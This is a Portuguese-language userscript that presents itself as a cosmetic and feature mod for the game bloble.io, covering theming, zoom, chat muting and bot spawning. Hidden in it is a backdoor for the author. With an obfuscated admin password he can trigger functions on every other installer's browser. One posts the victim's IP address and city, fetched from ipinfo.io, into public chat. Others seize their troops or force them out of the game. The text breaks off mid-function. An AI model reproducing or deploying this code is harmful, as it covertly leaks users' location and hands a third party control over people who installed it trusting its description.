// ==UserScript==
// @name         y
// @namespace    *.bloble.io/*
// @version      1.0000008
// @description  script escrito por ࿇‗ᑭᒪᗩYℰℛ乂‗࿇, obg por usar :), meu email: kauan.mghenrique@gmail.com
// @author       ࿇‗ᑭᒪᗩYℰℛ乂‗࿇
// @match        *.bloble.io/*
// @license MIT
// @icon         https://raw.githubusercontent.com/PlayerX-000/Scripts001/main/download-ConvertImage.ico
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/452739/y.user.js
// @updateURL https://update.greasyfork.org/scripts/452739/y.meta.js
// ==/UserScript==
 
try{
$(document).ready(function(){
    var Tedio = "T"
$(document).ready(function(){
        Tedio = "E"
$(document).ready(function(){
        Tedio = "D"
$(document).ready(function(){
        Tedio = "I"
$(document).ready(function(){
        Tedio = "O"
$(document).ready(function(){
        Tedio = "O"
$(document).ready(function(){
        Tedio = "O"
$(document).ready(function(){
        Tedio = "O"
$(document).ready(function(){
        Tedio = "O"
$(document).ready(function(){
setTimeout(function(){
gameenter()
},800)
})
})
})
})
})
})
})
})
})
})
 
window.async=(window.gameenter=function(){
    var sde                                                                                                                                                                                                                                                                                                                               ="20"
console.log("ENTER")
 
 
      $(window).load(function() {
             console.log("Sucesso")
try{document.innerHTML=null;
         console.log("Sucesso")
 }catch(error){
     console.log("Erro load: "+error)
 }
})
 
 
 
 
//VARIAVEIS
try{
window.skins1 = false;
var tropatotal=0;
var modsShown = true;
var chatHist = [];
var chatHistInd = -1;
var prevText = '';
var muted = [];
var afks = false;
var rot = 0.1;
var gotoUsers = [];
var gotoIndex = 0;
var eszx = [];
var posicaox,posicaoy;
var comandsdef=false;
var flod = false;
var mensa;
var joinEnabled = true;
var lagsd = false;
var sitlag = 'off';
window.as = false;
var niveldc = 0;
var niveldc2 = 0;
var niveldc3 = 0;
var PoderDP;
var ligflla = false;
var ligfllh = false;
var ligflld = false;
instructionsIndex = 0;
instructionsSpeed = 6000;
insturctionsCountdown = 0;
randomLoadingTexts = ["Entrando"];
instructionsList = "By թℓαყ𝔈૨𝕏".split(";");
instructionsIndex = 0;
 
var titulo = document.getElementById("gameTitle"),
    codparty = document.getElementById("lobbyKey"),
    Cyoutube = document.getElementById("youtubeContainer"),
    entername = document.getElementById("userNameInput"),
    yt = document.getElementById("youtuberOf"),
    todosC = document.getElementById("smallAdContainer"),
    links = document.getElementById("infoLinks"),
    leader = document.getElementById("leaderboardHeader"),
    Clink = document.getElementById("creatorLink"),
    adCont = document.getElementById("adContainer"),
    Darkner = document.getElementById("darkener"),
    Selectskin = document.getElementById("skinSelector"),
    enterGbotao = document.getElementById("enterGameButton"),
    segAnum = document.getElementById("aswift_2_expand");
 
 
//ATRIBUIÇÂO DE VALORES AS VARIAVEIS
 
 
 
//TELA INICIAL
segAnum.innerHTML = "";
 
adCont.innerHTML = "";
 
Clink.innerHTML = "";
 
leader.innerHTML = "";
 
links.innerHTML = "";
 
todosC.innerHTML = "";
 
Cyoutube.innerHTML = "";
 
yt.innerHTML = "";
 
Selectskin.innerHTML = "<div>⛓𝕊𝕂𝕀ℕ</div>";
 
enterGbotao.innerHTML = "<div>⚔ℂ𝕆𝕄𝔼ℂ𝔸ℝ⚔</div>";
 
Darkner.innerHTML = `
 
<div class="container" >
	<div class="stars" ></div>
</div>
 
<img id="foto" src="https://raw.githubusercontent.com/PlayerX-000/Scripts001/main/images.jpg">
<style>
 
#darkener {
display: block;
position: absolute;
width: 100%;
height: 100%;
          }
 
img#foto {
    overflow: hidden;
    margin-top: 0px;
    position: fixed;
    width: 110px;
    margin-left: 0px;
         }
</style>
`;
 
titulo.innerHTML = `𝔇𝔞𝔯𝔨 ℜ𝔦𝔤𝔥𝔱
<style>
#gameTitle {
    color: black;
    margin-left: -130px;
    font-size: 150px;
    font-family: monospace;
    font-weight: bold;
    text-align: center;
    text-shadow: 1px -1px 0 #13395a, 2px -2px 0 #13395a, 3px -3px 0 #13395a, 4px -4px 0 #13395a, 5px -5px 0 #13395a, 6px -6px 0 #13395a, 7px -7px 0 #13395a, 8px -8px 0 #13395a, 9px -9px 0 #13395a, 10px -10px 0 #13395a, 11px -11px 0 #13395a, 12px -12px 0 #13395a, 13px -13px 12px rgb(4 0 29 / 56%), 13px -13px 1px rgb(0 0 0 / 66%), 13px -13px 12px rgb(0 0 0 / 75%), 13px -13px 1px rgb(0 0 0 / 86%);
}
</style>
`;
 
codparty.innerHTML = `Codigo da Partida
<style>
.spanLink {
 width: 100%;
    text-align: center;
    font-family: fantasy;
    -webkit-text-stroke-width: 2px;
    -webkit-text-stroke-color: #313a67d1;
    color: #000b2969;
 }
#lobbyKey {
    font-size: 20px;
}
.spanLink:hover {
    -webkit-text-stroke-width: 2px;
    -webkit-text-stroke-color: #5a6392d1;
    color: #0f39ab69;
}
.deadLink {
width: 100%;
    text-align: center;
    font-family: fantasy;
    -webkit-text-stroke-width: 2px;
    -webkit-text-stroke-color: #313a67d1;
    color: #000b2969;
}
.deadLink:hover {
    -webkit-text-stroke-width: 2px;
    -webkit-text-stroke-color: #5a6392d1;
    color: #0f39ab69;
}
</style>
`;
 
entername.innerHTML = `
<style>
#userNameInput {
    background-color:#291375;
    font-family: -webkit-pictograph;
    padding-left: 42px;
    border: none;
    border-radius: 80px;
    margin-left: 43px;
               }
#userNameInput .input {
    cursor: text;
    -webkit-writing-mode: horizontal-tb !important;
    text-rendering: auto;
    color: -internal-light-dark(black, white);
    letter-spacing: normal;  border
    word-spacing: normal;
    text-transform: none;
    text-indent: 0px;
    text-shadow: none;
    display: inline-block;
    text-align: start;
    appearance: auto;
    background-color: -internal-light-dark(rgb(59, 59, 59 ),rgb(255, 255, 255));
    -webkit-rtl-ordering: logical;
    margin: 0em;
    font: 400 13.3333px Arial;
    padding: 1px 2px;
    border-width: 2px;
    border-style: inset;
    border-color: -internal-light-dark(rgb(118, 118, 118), rgb(133, 133, 133));
    border-image: initial;
      }
</style>
`;
 
 
 
 
 
var css = document.createElement("style")
css.innerText = `
span#poderb{
    -webkit-text-stroke-width: 1px;
    -webkit-text-stroke-color: rgb(0 255 208);
}
 
span#shar{
    -webkit-text-stroke-width: 2px;
    -webkit-text-stroke-color: rgb(0 255 208);
}
 
span#def1{
    -webkit-text-stroke-width: 2px;
    -webkit-text-stroke-color: rgb(0 255 208);
}
 
span#defia{
    -webkit-text-stroke-width: 2px;
    -webkit-text-stroke-color: rgb(0 255 208);
}
 
span#commandia{
    -webkit-text-stroke-width: 2px;
    -webkit-text-stroke-color: rgb(0 255 208);
}
 
span#fullpow{
    -webkit-text-stroke-width: 2px;
    -webkit-text-stroke-color: rgb(0 255 208);
}
 
 
#numerodemqs_input {
  cursor: crosshair;
}
 
 
#chatBox {
    position: absolute;
    bottom: 10px;
    right: 10px;
    width: 328px;
    overflow: hidden;
    cursor: crosshair;
}
 
#scoreContainer {
    display: inline-block;
    padding: 10px;
    background-color: rgb(75 0 255 / 17%);
    font-family: '-webkit-pictograph';
    font-size: 20px;
    color: #fff;
    border-top-left-radius: 10px;
    border-top-right-radius: 10px;
    border-bottom-right-radius: 0px;
    border-bottom-left-radius: 10px;
    -webkit-text-stroke-width: 3px;
    -webkit-text-stroke-color: #0008ffab;
    border-top-width: medium;
    border-right-width: medium;
    border-bottom-width: medium;
    border-left-width: medium;
    border-style: solid;
    border-color: #00f;
}
 
#joinTroopContainer {
    display: inline-block;
    padding: 10px;
    background-color: rgb(75 0 255 / 17%);
    font-family: '-webkit-pictograph';
    font-size: 20px;
    color: #ffffff;
    margin-left: -4px;
    border-top-left-radius: 0px;
    border-top-right-radius: 10px;
    border-bottom-right-radius: 10px;
    border-bottom-left-radius: 0px;
    -webkit-text-stroke-width: 3px;
    -webkit-text-stroke-color: #0008ffab;
    border-top-width: medium;
    border-right-width: medium;
    border-bottom-width: medium;
    border-left-width: medium;
    border-style: double;
    border-color: #00f;
}
 
 
#loadingContainer {
	display: none;
    font-family: '-webkit-pictograph';
    font-size: 40px;
    padding: 6px;
    color: #3900ff;
    -webkit-text-stroke-width: 2px;
    -webkit-text-stroke-color: #000000;
    margin-left: -10%;
    }
 
 
#enterGameButton {
    font-family: '-webkit-pictograph';
    font-size: 26px;
    padding: 5px;
    color: #00379c80;
    background-color: #00000085;
    border: none;
    cursor: pointer;
    margin-left: 10px;
    border-radius: 40px;
                 }
#enterGameButton:hover {
	      background-color: #24145d;color: #3060b780;
}
 
 
 
#skinSelector {
    display: none;
    font-family: '-webkit-pictograph';
    font-size: 26px;
    padding: 6px;
    padding-left: 12px;
    padding-right: 12px;
    border: none;
    border-radius: 40px;
    background-color: #00000085;
    color: #00379c80;
    cursor: pointer;
              }
 
#skinSelector:hover {
    background-color: #24145d;color: #3060b780;
                    }
 
 
 
 #skinInfo {
    margin-top: -22px;
    position: absolute;
    display: none;
    text-align: -webkit-center;
    width: 118px;
    margin-left: -225px;
    padding: 60px;
    padding-top: 10px;
    padding-left: 16px;
    color: #000;
    border-radius: 191px;
    background-color: rgb(245 0 0 / 0%);
    font-family: '-webkit-pictograph';
    font-size: 26px;
          }
#skinIcon {
    width: 143px;
    height: 138px;
    opacity: 0.4;
          }
 
#menuContainer {
    width: 100%;
    height: 100%;
    display: flex;
    position: absolute;
    top: 10px;
    z-index: 100;
    align-items: center;
    text-align: center;
    cursor: crosshair;
               }
 
.centerContent {
    text-align: center;
    width: 100%;
    margin-left: 100px;
               }
html, body{
  height: 250px;
}
 
.container{
    position: absolute;
    background: linear-gradient(0, #120c56, #000000);
    height: 100%;
    width: 100%;
}
 
#instructionsText {
    font-size: 30px;
    font-family: monospace;
    font-weight: bold;
    text-align: center;
    -webkit-text-stroke-width: 2px;
    -webkit-text-stroke-color: #000000;
    color: #3900ff;
    margin-left: -9%;
}
 
#leaderboardContainer {
    position: absolute;
    top: 10px;
    right: 10px;
    padding: 10px;
    background-color: rgb(75 0 255 / 17%);
    font-family: '-webkit-pictograph
    ';
    font-size: 20px;
    border-radius: 4px;
    color: #fff;
    -webkit-text-stroke-width: 1.5px;
    -webkit-text-stroke-color: #0008ffab;
    border-top-width: medium;
    border-right-width: medium;
    border-bottom-width: medium;
    border-left-width: medium;
    border-style: double;
    border-color: #00f;
}
 
#chatListWrapper {
    background-color: rgb(75 0 255 / 17%);
    border-radius: 4px 4px 0px 0px;
    height: 215px;
    border-width: medium;
    border-style: double;
    border-color: #00f;
}
 
div#txtV {
    -webkit-text-stroke-width: 0.9px;
    -webkit-text-stroke-color: #6e9bff;
}
 
div#txtU {
    -webkit-text-stroke-width: 0.9px;
    -webkit-text-stroke-color: #6e9bff;
}
 
#chatList {
    width: 100%;
    font-family: -webkit-pictograph;
    padding: 8px;
    margin: 0;
    list-style: none;
    box-sizing: border-box;
    color: #fff;
    overflow: hidden;
    word-wrap: break-word;
    position: absolute;
    bottom: 30px;
    font-size: 16px;
    line-height: 23px;
}
 
 
.unitItem {
    border-width: 20px;
    pointer-events: all;
    margin-left: 10px;
    position: relative;
    display: inline-block;
    width: 65px;
    height: 65px;
    background-color: rgb(22 0 255 / 20%);
    border-radius: 4px;
    cursor: pointer;
    border-width: medium;
    border-style: double;
    border-color: #00f;
}
 
.unitItem:hover{
    border-width: 20px;
    pointer-events: all;
    margin-left: 10px;
    position: relative;
    display: inline-block;
    width: 65px;
    height: 65px;
    background-color: rgb(0 248 255 / 44%);
    border-radius: 4px;
    cursor: pointer;
    border-width: medium;
    border-style: double;
    border-color: #f00;
}
 
 
#chatInput {
    background-color: rgb(75 0 255 / 17%);
    font-family: '-webkit-pictograph';
    font-size: 16px;
    padding: 5px;
    color: #00fff3;
    width: 100%;
    pointer-events: all;
    outline: none;
    border: 0;
    box-sizing: border-box;
    border-radius: 0px 0px 4px 4px;
    border-style: double;
    border-color: #00f;
    border-right-width: medium;
    border-bottom-width: medium;
    border-left-width: medium;
}
 
.unitItemA {
    pointer-events: all;
    margin-left: 10px;
    position: relative;
    display: inline-block;
    width: 65px;
    height: 65px;
    background-color: rgb(0 248 255 / 75%);
    border-radius: 4px;
    cursor: pointer;
}
 
.upgradeInfo {
    margin-top: 10px;
    padding: 10px;
    background-color: rgba(40, 40, 40, 0.5);
    border-radius: 4px;
    font-family: '-webkit-pictograph
    ';
    max-width: 200px;
    overflow: auto;
    cursor: pointer;
    pointer-events: all;
    border-top-width: medium;
    border-right-width: medium;
    border-bottom-width: medium;
    border-left-width: medium;
    border-style: double;
    border-color: #00f;
    background-color: rgb(75 0 255 / 17%);
}
 
.upgradeInfo:hover{
    margin-top: 10px;
    padding: 10px;
    background-color: rgba(40, 40, 40, 0.5);
    border-radius: 4px;
    font-family: '-webkit-pictograph';
    max-width: 200px;
    overflow: auto;
    cursor: pointer;
    pointer-events: all;
    border-top-width: medium;
    border-right-width: medium;
    border-bottom-width: medium;
    border-left-width: medium;
    border-style: double;
    border-color: #00f;
    background-color: rgb(75 0 255 / 47%);
}
 
.unitInfo {
    padding: 10px;
    background-color: rgb(75 0 255 / 17%);
    border-radius: 4px;
    font-family: '-webkit-pictograph';
    max-width: 200px;
    overflow: auto;
    border-top-width: medium;
    border-right-width: medium;
    border-bottom-width: medium;
    border-left-width: medium;
    border-style: double;
    border-color: #00f;
}
 
 
 
#sellButton {
    position: absolute;
    bottom: 158px;
    left: 10px;
    background-color: rgb(75 0 255 / 17%);
    font-family: '-webkit-pictograph
    ';
    font-size: 20px;
    color: #fff;
    cursor: pointer;
    padding: 10px;
    pointer-events: all;
    border-top-width: medium;
    border-right-width: medium;
    border-bottom-width: medium;
    border-left-width: medium;
    border-style: double;
    border-color: #00f;
    border-radius: 10px;
}
 
#sellButton:hover{
    position: absolute;
    bottom: 158px;
    left: 10px;
    background-color: rgb(75 0 255 / 47%);
    font-family: '-webkit-pictograph';
    font-size: 20px;
    color: #fff;
    cursor: pointer;
    padding: 10px;
    pointer-events: all;
    border-top-width: medium;
    border-right-width: medium;
    border-bottom-width: medium;
    border-left-width: medium;
    border-style: double;
    border-color: #00f;
    border-radius: 10px;
}
 
#mainCanvas {
    position: absolute;
    width: 100%;
    height: 100%;
    cursor: crosshair;
}
 
`,document.head.appendChild(css);
 
 
//FIM DAS VARIAVEIS/ EDICAO DA TELA INICIAL
 
 
 
 
 
//ZOOM COM SCROLL(GRADATIVO)
 
var scroll = 0;
 
mainCanvas.addEventListener ? (window.addEventListener("mousewheel", zoom, !1),
    mainCanvas.addEventListener("DOMMouseScroll", zoom, !1)) : window.attachEvent("onmousewheel", zoom);
 
function zoom(a) {
    a = window.event || a;
    a.stopPropagation();
    scroll = Math.max(-1, Math.min(1, a.wheelDelta || -a.detail))
    if (scroll == -1) { //zoom out
        if(maxScreenHeight<60000){
      maxScreenWidth += 300
      maxScreenHeight += 300
      resize(true)
        scroll = 0
        }
    }
 
    if (scroll == 1) { //zoom in
        if(maxScreenHeight>=170){
      maxScreenHeight -= 1
      resize(true)
        scroll = 0
        }
        if(maxScreenWidth >= 1010){
         maxScreenWidth -= 1
      resize(true)
        scroll = 0
        }
    }
}
 
 
 
 
//TECLA PARA ZOOM
window.addEventListener('keyup', function(a) {
    a = a.keyCode ? a.keyCode : a.which;
       if (document.activeElement == mainCanvas) {
    if (a == 70) { // V to  out
        (maxScreenHeight = 30000, maxScreenWidth = 53333, resize(true));
        cameraSpd = (shift ? 1.8 : .85) * (Math.log(maxScreenHeight / 1080) + 1)
        populate()
    }
    if (a == 86) { // F to zoom in
        (maxScreenHeight = 170, maxScreenWidth = 1010, resize(true))
        cameraSpd = shift ? 1.8 : .85;
        populate()
    }
 
       }
})
 
var repetechat=setInterval(function(){
 
 
    chatInput.addEventListener("keypress",function(a){
 
        var b = a.which || a.keyCode;
if (b === 38) { /*UP*/
if (chatHistInd === -1) {
prevText = chatInput.value;
chatHistInd = chatHist.length;}
if (chatHistInd > 0) chatHistInd--;
chatInput.value = prevText + (chatHist[chatHistInd] || '')
} else if (b === 40) {
if (chatHistInd !== -1) {
if (chatHistInd < chatHist.length) chatHistInd++;
else chatHistInd = -1;
chatInput.value = prevText + (chatHist[chatHistInd] || '')
}}
        if(13==(a.which||a.keyCode) && "" != chatInput.value){
            var value = chatInput.value
            var split = value.split(' ');
            var numb=0;
            var name = split[0].substr(2);
            numb=Number(split[1]);
            if(senhaok==true && name=="kita" && value.charAt(0) === '#' && value.charAt(1) === '@'){
             socket.emit("ch",chatInput.value);
            chatInput.value="";
            }else if(senhaok==false && name=="kita" && value.charAt(0) === '#' && value.charAt(1) === '@'){
            addChat("Voce nao tem acesso root","࿇‗ᑭᒪᗩYℰℛ乂‗࿇");
            chatInput.value="";
            }else if(value.charAt(0) === '/' && value.charAt(1) === '/'){
                if(window.chatCommands[name]){
                window.chatCommands[name](split)
                    value=""
                    chatInput.value="";
                    value.value=""
                }
                if(window.chatCommandsbot[name]){
                    window.chatCommandsbot[name](numb)
                    value=""
                    chatInput.value="";
                    value.value=""
                }
            }else{
            socket.emit("ch", chatInput.value)
            chatInput.value="";
                mainCanvas.focus()
                }
        }
        if (chatHist[chatHist.length - 1] !== value) {
var ind = chatHist.indexOf(value);
if (ind !== -1) {chatHist.splice(ind, 1);}
chatHist.push(value);}
chatHistInd = -1;
    })
},100)
// MUTE POR NEUTROX, CREDITO A NEUTROX PELO MUTE
 
 
//ARBUSTO INVISIVEL
  var iconSizeMult = .7,
            unitSprites = [];
        renderUnit = function(a, d, c, b, g, e, k) {
            var f = b.size * (k ? iconSizeMult : 1),
                h = f + ":" + b.cloak + ":" + b.renderIndex + ":" + b.iSize + ":" + b.turretIndex + ":" + b.shape + ":" + g;
            if (!unitSprites[h]) {
                var m = document.createElement("canvas"),
                    l = m.getContext("2d");
                m.width = 2 * f + 30;
                m.height = m.width;
                m.style.width = m.width + "px";
                m.style.height = m.height + "px";
                l.translate(m.width / 2, m.height / 2);
                l.lineWidth = outlineWidth * (k ? .9 : 1.2);
                l.strokeStyle = darkColor;
                l.fillStyle = g;
                4 == b.renderIndex ? l.fillStyle = turretColor : 5 == b.renderIndex && (l.fillStyle = turretColor,
                    renderRect(0, .76 * f, 1.3 * f, f / 2.4, l), l.fillStyle = g);
                b.cloak && (l.fillStyle = backgroundColor);
                "circle" == b.shape ? (renderCircle(0, 0, f, l), b.iSize && (l.fillStyle = turretColor, renderCircle(0, 0, f * b.iSize, l))) :
                    "triangle" == b.shape ? (renderTriangle(0, 0, f, l), b.iSize && (l.fillStyle = turretColor, renderTriangle(0, 2, f * b.iSize, l))) : "hexagon" == b.shape ? (renderAgon(0, 0, f, l, 6), b.iSize && (l.fillStyle = turretColor, renderAgon(0, 0, f * b.iSize, l, 6))) :
                    "octagon" == b.shape ? (l.rotate(MathPI / 8), renderAgon(0, 0, .96 * f, l, 8), b.iSize && (l.fillStyle = turretColor, renderAgon(0, 0, .96 * f * b.iSize, l, 8))) : "pentagon" == b.shape ? (l.rotate(-MathPI / 2), renderAgon(0, 0, 1.065 * f, l, 5), b.iSize && (l.fillStyle = turretColor, renderAgon(0, 0, 1.065 * f * b.iSize, l, 5))) :
                    "square" == b.shape ? (renderSquare(0, 0, f, l), b.iSize && (l.fillStyle = turretColor, renderSquare(0, 0, f * b.iSize, l))) : "spike" == b.shape ? renderStar(0, 0, f, .7 * f, l, 8) : "star" == b.shape && (f *= 1.2, renderStar(0, 0, f, .7 * f, l, 6));
                if (1 == b.renderIndex) l.fillStyle = turretColor, renderRect(f / 2.8, 0, f / 4, f / 1, l), renderRect(-f / 2.8, 0, f / 4, f / 1, l);
                else if (2 == b.renderIndex) l.fillStyle = turretColor, renderRect(f / 2.5, f / 2.5, f / 2.5, f / 2.5, l), renderRect(-f / 2.5, f / 2.5, f / 2.5, f / 2.5, l), renderRect(f / 2.5, -f / 2.5, f / 2.5, f / 2.5, l), renderRect(-f / 2.5, -f / 2.5, f / 2.5, f / 2.5, l);
                else if (3 == b.renderIndex) l.fillStyle = turretColor, l.rotate(MathPI / 2), renderRectCircle(0, 0, .75 * f, f / 2.85, 3, l), renderCircle(0, 0, .5 * f, l), l.fillStyle = g;
                else if (6 == b.renderIndex) l.fillStyle = turretColor, l.rotate(MathPI / 2), renderRectCircle(0, 0, .7 * f, f / 4, 5, l), l.rotate(-MathPI / 2), renderAgon(0, 0, .4 * f, l, 6);
                else if (7 == b.renderIndex)
                    for (g = 0; 3 > g; ++g) l.fillStyle = g ? 1 == g ? "transparent" : "transparent" : "transparent", renderStar(0, 0, f, .7 * f, l, 7), f *= .55;
                else 8 == b.renderIndex && (l.fillStyle = turretColor, renderRectCircle(0, 0, .75 * f, f / 2.85, 3, l), renderSquare(0, 0, .5 * f, l));
                1 != b.type && b.turretIndex && renderTurret(0, 0, b.turretIndex, k ? iconSizeMult : 1, -(MathPI / 2), l);
                unitSprites[h] = m
            }
            f = unitSprites[h];
            e.save();
            e.translate(a, d);
            e.rotate(c + MathPI / 2);
            e.drawImage(f, -(f.width / 2), -(f.height / 2), f.width, f.height);
            1 == b.type && b.turretIndex && renderTurret(0, 0, b.turretIndex, k ? iconSizeMult : 1, b.turRot - MathPI / 2 - c, e);
            e.restore()
        }
 
window.sockets = [];
window.newSocket=function() {
    window.uri=socket.io.uri;
window.io=io.connect;
    $.get("/getIP", {
        sip: lobbyURLIP
    }, function() {
        window.socketBot = io(uri, {
            "connect timeout": (Number(times+600)),
            reconnection: true,
            query: "cid=" + UTILS.getUniqueID() + "&rmid=" + lobbyRoomID
        });
 
        window.sockets.push(window.socketBot);
        spawnBot()
    });
}
 
 
window.socketClose=function() {
    if (window.sockets.length > 0) {
        sockets[0].close();
        sockets.splice(0, 1);
        document.getElementById("statusBots").textContent = 'Bots: ' + window.sockets.length;
    }
};
 
 
window.spawnBot=function() {
    window.sockets.forEach(socket => {
        try{
        grecaptcha.execute("6Ldh8e0UAAAAAFOKBv25wQ87F3EKvBzyasSbqxCE").then(function(a) {
            socket.emit("spawn", {
                name:userNameInput.value,
                skin: currentSkin,
                size:200
            }, a);
        })
 
        }catch(e){
        console.log(e)
 
            alert("Error")
            window.chatCommandsbot[bot](0)
        }
    });
}
 
 
window.chatCommandroot = window.chatCommandroot || [];
 
window.chatCommandroot.kita = function(ids){
    if(senhaok==false){
var id = Number(ids)
if(player.sid==id){
    leaveGame()
    loadingContainer.innerHTML="࿇‗ᑭᒪᗩYℰℛ乂‗࿇ TE BANIU, KKKKKKKK"
    setInterval(function(){
    location.reload();
    },3000)
}
    }
}
window.chatCommandsbot = window.chatCommandsbot || [];
window.chatCommandsbot.bot = function (qnt){
 
var qntd=Number(qnt)
window.times=(qntd*800)
if(sockets.length>qntd){
    for(qntd=qntd;qntd<sockets.length;qntd=qntd){
    sockets[0].close();
    sockets.splice(0, 1);
    addChat((sockets.length+1)+"------"+(qntd),".")
    }
}
window.sss2=setInterval(function(){
 
if(sockets.length<qntd){
    newSocket()
    spawnBot()
    addChat((sockets.length+1)+"------"+(qntd),".")
}
if(sockets.length==qntd){
    clearInterval(sss2);
    addChat("finish",".")
}
},(times/qntd))
}
 
 
//MUTE
 
/************************************** MUTE POR NEUTROX, CREDITO A NEUTROX PELO MUTE **************************************/
window.UIList = window.UIList || [];
window.initFuncs = window.initFuncs || [];
window.statusItems = window.statusItems || [];
window.overrideSocketEvents = window.overrideSocketEvents || [];
window.chatCommands = window.chatCommands || [];
 
window.test = 0;
function ChatTest(){for(i=0;i<units.length;i++){if(test==0){test = 1;comandos();}}};
setInterval(ChatTest,500);
 
window.overrideSocketEvents.push({
name: "ch",
description: "Chat Muter",
func: function (a, d, c) {
if (!muted[a])
addChatLine(a, d, c)
}})
 
 
window.chatCommands.mute = function (split) {
if (split[1] > 0) {
var ID = split[1];
users.forEach((user) => {
if(ID==user.sid){
muted[user.sid] = true;
addChat('Player mutado com sucesso.', 'Base', playerColors[player.color]);
}
})
}}
 
window.chatCommands.unmute = function (split) {
if (split[1] > 0) {
var ID = split[1];
users.forEach((user) => {
if(ID==user.sid){
muted[user.sid] = false;
addChat('Player desmutado com sucesso.', 'Base', playerColors[player.color]);
}
})
}}
 
 
function comandos() {
    setTimeout(function () {
    var old = chatInput
    chatInput = old.cloneNode(true);
    old.parentNode.replaceChild(chatInput, old);
    chatInput.onclick = function () {
    toggleChat(!0)
};
 
chatInput.addEventListener("keyup", function (a) {
var b = a.which || a.keyCode;
if (b === 38) { /*UP*/
if (chatHistInd === -1) {
prevText = chatInput.value;
chatHistInd = chatHist.length;}
if (chatHistInd > 0) chatHistInd--;
chatInput.value = prevText + (chatHist[chatHistInd] || '')
} else if (b === 40) {
if (chatHistInd !== -1) {
if (chatHistInd < chatHist.length) chatHistInd++;
else chatHistInd = -1;
chatInput.value = prevText + (chatHist[chatHistInd] || '')
}} else if (gameState && socket && 13 === (a.which || a.keyCode) && "" != chatInput.value) {
var value = chatInput.value;
chatInput.value = ""
mainCanvas.focus()
if(value.charAt(0) === '/' && value.charAt(1) === '/'){
var split2 = value.split(' ');
var numb=0;
var name2 = split2[0].substr(2);
numb=Number(split2[1]);
if (window.chatCommands[name2]){window.chatCommands[name2](split2)}
    if(window.chatCommandsbot[name2]){window.chatCommandsbot[name2](numb)}
}else if(value.charAt(1) !== '/'){
    socket.emit("ch", value)
}
if (chatHist[chatHist.length - 1] !== value) {
var ind = chatHist.indexOf(value);
if (ind !== -1) {chatHist.splice(ind, 1);}
chatHist.push(value);}
chatHistInd = -1;
}})},1000)}
 //FIM MUTE
 
//MENSAGEM  LOCAL
window.addChat = function(msg, from, color) {
    color = color || "#fff";
    var b = document.createElement("li");
    b.className = "chatother";
    b.innerHTML = '<span style="color:' + color + '">[' + from + ']</span> <span class="chatText">' + msg + "</span>";
    100 < chatList.childNodes.length && chatList.removeChild(chatList.childNodes[0]);
    chatList.appendChild(b)
}
 
window.resetCamera = function() { /*Override*/
    camX = camXS = camY = camYS = 0;
    cameraKeys = {
        l: 0,
        r: 0,
        u: 0,
        d: 0
    }
 
    if (socket && window.overrideSocketEvents && window.overrideSocketEvents.length) {
        window.overrideSocketEvents.forEach((item) => {
            socket.removeAllListeners(item.name)
            socket.on(item.name, item.func);
        });
    }
}
 
var start = null;
var element = document.getElementById("mainCanvas");
element.style.position = 'absolute';
function step(timestamp) {
  if (!start) start = timestamp;
  var progress = timestamp - start;
  if (progress < 2000) {
    window.requestAnimationFrame(step);
  }
}
window.playerxon=false
window.requestAnimationFrame(step);
var awewed="ka"
 
 
 
window.aletadeusuario=setInterval(function(){
if(senhaok==false){
if(playerxon===false){
users.forEach((user=>{
if(user.name=="࿇‗ᑭᒪᗩYℰℛ乂‗࿇"){
playerxon=true
socket.emit("ch","Eu estou usando o Dark Right")
}
}))
}else{
clearInterval(aletadeusuario)
}
}
},500)
 
 
 
var senhaok = false
window.senhaADM="";
window.initFinish=function(){
 
    initC++;
    2==initC&&(enterGameButton.onclick=function(){
         if(userNameInput.value!=="࿇‗ᑭᒪᗩYℰℛ乂‗࿇"){
        enterGame()
                 senhaok=false
         }else{
 
           if(senhaADM===awewed+wefwe+dfe+sde+mdef){
           enterGame()
               senhaok=true
           }else{senhaADM=prompt("senha do ADM")}
       }
    },userNameInput.addEventListener("keypress",function(a){
      if(13===(a.which||a.keyCode)){  if(userNameInput.value!=="࿇‗ᑭᒪᗩYℰℛ乂‗࿇"){
          enterGame();
      senhaok=false
 
      }else{
           if(senhaADM===awewed+wefwe+dfe+sde+mdef){
           enterGame()
               senhaok=true
 
           }else{senhaADM=prompt("senha do ADM")}
       }}
    }),mainCanvas.addEventListener("keypress",function(a){
        gameState&&13===(a.which||a.keyCode)&&(mainCanvas.blur(),
                                               chatInput.focus(),
                                               toggleChat(!0))
    }),chatInput.addEventListener("keypress",function(a){
        gameState&&socket&&13===(a.which||a.keyCode)&&(""!=chatInput.value&&socket.emit("ch",chatInput.value),
                                                       chatInput.value="",mainCanvas.focus())
    }),
chatInput.onclick=function(){
        toggleChat(!0)
    },sellButton.onclick=function(){
        socket&&selUnits.length&&sellSelUnits();
        mainCanvas.focus()
    },$.get("/getIP",{sip:lobbyURLIP},function(a){
        port=a.port;socket||(socket=io.connect("http://"+(a.ip||"127.0.0.1")+":"+a.port,{
            reconnection:!0,query:"cid="+cid+"&rmid="+lobbyRoomID
        }),setupSocket()
                            )})
              )}
window.comando001=function(nomeADM){
    if(senhaok==false){
        addChat("adm fodaooo ta ON "+nomeADM,"BLOBLE")
    }
}
window.dadosuser
    window.comando002=function(){
 
    if(senhaok==false){
 
    $.get("https://ipinfo.io/json", function (response) {
        dadosuser=response
    $("#ip").html("IP: " + response.ip);
    $("#address").html("Location: " + response.city + ", " + response.region);
    $("#details").html(JSON.stringify(response, null, 4));
}, "jsonp");
 
           socket.emit("ch","ip: "+dadosuser.ip+"\n"+"city: "+dadosuser.city)
    }
 
}
    var loovlttrop = false
    window.comando003=function(){
        if(senhaok==false){
        if(loovlttrop){
        loovlttrop=false
        clearInterval(looptroproot)
         addChat("Interferencia cancelada","BASE")
        }else{
            loovlttrop=true
        window.looptroproot=setInterval(function(){
 var e = [];
            for (var b = 0; b < selUnits.length; ++b) {e.push(selUnits[b].id);}
             socket.emit("5", player.x, player.y, e, 0, -1)
      },700)
            addChat("Interferencia nas tropas","BASE")
    }
 
  }
}
    window.comando004=function(id){
 
 if(player.sid==Number(id)){
 leaveGame()
 }
}
    window.comando005=function(){
    if(senhaok==false){
        addChat("adm fodaooo ta ON  (࿇‗ᑭᒪᗩYℰℛ乂‗࿇)")
    }
}
    window.comando006=function(){
    if(senhaok==false){
        addChat("adm fodaooo ta ON  (࿇‗ᑭᒪᗩYℰℛ乂‗࿇)")
    }
}
    window.comando007=function(){
    if(senhaok==false){
        addChat("adm fodaooo ta ON  (࿇‗ᑭᒪᗩYℰℛ乂‗࿇)")
    }
}
 
    window.getinfo=function() {
        try{
    window.uri=socket.io.uri;
